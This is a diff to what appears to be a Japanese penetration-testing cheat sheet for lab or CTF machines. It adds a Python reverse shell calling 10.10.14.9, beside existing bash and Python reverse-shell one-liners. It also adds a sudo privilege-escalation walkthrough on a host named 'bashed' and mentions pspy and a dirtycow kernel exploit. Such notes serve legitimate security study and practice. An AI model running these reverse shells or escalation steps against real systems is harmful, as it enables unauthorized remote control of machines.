@@ -743,9 +743,18 @@ Bash:
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-Python:
+Python:  
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+```
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.9",9004))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 ```
 
 Perl:
@@ -1215,6 +1224,21 @@ ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行
 馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
 pspy:  
 https://github.com/DominicBreuker/pspy
+
+
+### ユーザを指定してコマンドを実行
+```
+www-data@bashed:/$ sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+www-data@bashed:/$ sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/$ whoami
+scriptmanager
+```
 
 ### kernel exploit
 #### dirtycow
